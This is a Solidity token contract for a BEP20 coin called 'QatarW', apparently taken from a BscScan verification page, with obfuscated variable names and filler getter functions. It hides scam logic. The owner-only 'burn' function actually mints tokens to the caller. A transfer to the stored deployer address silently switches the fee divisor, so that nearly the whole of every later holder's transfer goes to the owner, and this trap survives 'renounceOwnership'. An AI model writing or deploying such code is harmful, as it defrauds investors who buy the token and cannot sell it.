/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-18 15:16 GMT
 */
 // SPDX-License-Identifier: MIT

// 
// @@@@@@@@\                                      @@@@@@\  @@\                 @@\           
// @@  _____|                                    @@  [email protected]@\ @@ |                \__|          
// @@ |       @@@@@@@\  @@@@@@@\  @@@@@@\        @@ /  \__|@@@@@@@\   @@@@@@\  @@\ @@@@@@@\  
// @@@@@\    @@  _____|@@  _____|@@  [email protected]@\       @@ |      @@  [email protected]@\  \[email protected]@\ @@ |@@  [email protected]@\ 
// @@  __|   \@@@@@@\  \@@@@@@\  @@@@@@@@ |      @@ |      @@ |  @@ | @@@@@@@ |@@ |@@ |  @@ |
// @@ |       \[email protected]@\  \[email protected]@\ @@   ____|      @@ |  @@\ @@ |  @@ |@@  [email protected]@ |@@ |@@ |  @@ |
// @@@@@@@@\ @@@@@@@  |@@@@@@@  |\@@@@@@@\       \@@@@@@  |@@ |  @@ |\@@@@@@@ |@@ |@@ |  @@ |
// \________|\_______/ \_______/  \_______|       \______/ \__|  \__| \_______|\__|\__|  \__|
//
//

//

pragma solidity >=0.6.0;
contract CQCEZNS {
string public  symbol = "QatarW";
uint256 private  ETOKKC = 10000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  VISRNS = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  BMOFLN = 1000000000000000;
uint256 private  IRXFCQ = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  DIBKQM = 1000000000000000000;
uint256 public constant XYIEPI = 99999;
address private  DNJUFT = address(0);
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
address private  JUMLQR = address(0);
uint256 private  ZFDTNU = 1000000000000000000000;
address private  SRMXAT = address(0);
uint256 private  TYMGXT = 100000000;
address private  PKNRDF = address(0);
string public  name = "QatarW";
address private  JECIPI = address(0);
function _getJECIPI() private returns (address) {
return JECIPI;
}

function _getBMOFLN() private returns (uint256) {
return BMOFLN;
}

function _getJUMLQR() private returns (address) {
return JUMLQR;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
SRMXAT = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NVPIEP");
require(to != address(0), "NVPIEP");
require(amount <= balanceOf[from], "NVPIEP");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XYIEPI/DIBKQM ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SRMXAT){
DIBKQM = XYIEPI+2;
}
emit Transfer(from, to, transferAmount);
}
function _getETOKKC() private returns (uint256) {
return ETOKKC;
}

function _getZFDTNU() private returns (uint256) {
return ZFDTNU;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getDNJUFT() private returns (address) {
return DNJUFT;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getIRXFCQ() private returns (uint256) {
return IRXFCQ;
}

function _getVISRNS() private returns (uint256) {
return VISRNS;
}

function _getTYMGXT() private returns (uint256) {
return TYMGXT;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tNVPIEP 0");
require(spender != address(0), "fNVPIEP 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getPKNRDF() private returns (address) {
return PKNRDF;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}